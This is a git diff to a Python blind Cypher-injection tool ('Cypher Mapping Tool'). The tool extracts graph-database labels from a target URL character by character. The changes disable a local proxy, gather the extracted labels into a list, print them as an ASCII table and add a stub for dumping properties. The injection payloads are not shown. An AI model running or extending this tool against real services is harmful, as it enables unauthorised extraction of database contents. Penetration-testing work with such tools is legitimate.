@@ -9,8 +9,8 @@ import sys
 ascii_chars='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~'
 
 def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
-    #proxies={}
-    proxies={'http':'http://localhost:8080'}
+    proxies={}
+    #proxies={'http':'http://localhost:8080'}
     headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
     try:
         if post_data:
@@ -99,6 +99,7 @@ def get_size_of_label(target_url, label_index, injection_type, blind_string, pos
 
 def dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
     global ascii_chars
+    label_array=[]
     for label_index in range(0,number_of_labels,1):
         label_size=get_size_of_label(target_url,label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
         print(f"Size of label number {label_index}: {label_size}")
@@ -116,7 +117,35 @@ def dump_labels(target_url, number_of_labels, injection_type, blind_string, post
                     label_value+=current_char
                     print("\r"+(80*" ")+f"\rValue of label number {label_index}: {label_value}",end='')
                     break
+        label_array.append(label_value)
         print("\n")
+    print("")
+    dump_ascii_table(label_array)
+    return label_array
+
+def dump_ascii_table(data):
+    # determine the number of columns
+    num_columns = len(data[0]) if isinstance(data[0], list) else 1
+
+    # determine the maximum width of each column
+    if num_columns == 1:
+        column_widths = [max(len(str(data[i])) for i in range(len(data)))]
+    else:
+        column_widths = [max(len(str(data[i][j])) for i in range(len(data))) for j in range(num_columns)]
+
+    # print the table header
+    print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
+
+    # print the table contents
+    for row in data:
+        if isinstance(row, list):
+            print('| ' + ' | '.join(str(row[i]).ljust(column_widths[i]) for i in range(num_columns)) + ' |')
+        else:
+            print('| ' + str(row).ljust(column_widths[0]) + ' |')
+
+    # print the table footer
+    print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
+
 
 print('\nCypher Mapping Tool by sectroyer v0.1\n')
 
@@ -127,7 +156,7 @@ try:
     parser.add_argument('-c', '--cookie', help='Request cookie', default={})
     parser.add_argument('-s', '--string', help='Blind string')
     parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
-    parser.add_argument('-L', '--labels', help='Dump labels', action='store_true')
+    parser.add_argument('-L', '--labels', help='Dump labels', nargs='?', const=True)
     args = parser.parse_args()
 
     target_url = args.url
@@ -151,11 +180,13 @@ try:
     else:
         print("Unable to find valid injection type...\n")
         sys.exit(-1)
-    if args.labels:
+    if args.labels == True:
         print("Dumping labels....\n")
         number_of_labels = get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
         print(f"Number of labels found: {number_of_labels}\n")
         dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+    elif args.labels:
+        print(f"Dumping properties for labels: {args.labels}...\n")
 
     print('')
 except SystemExit:
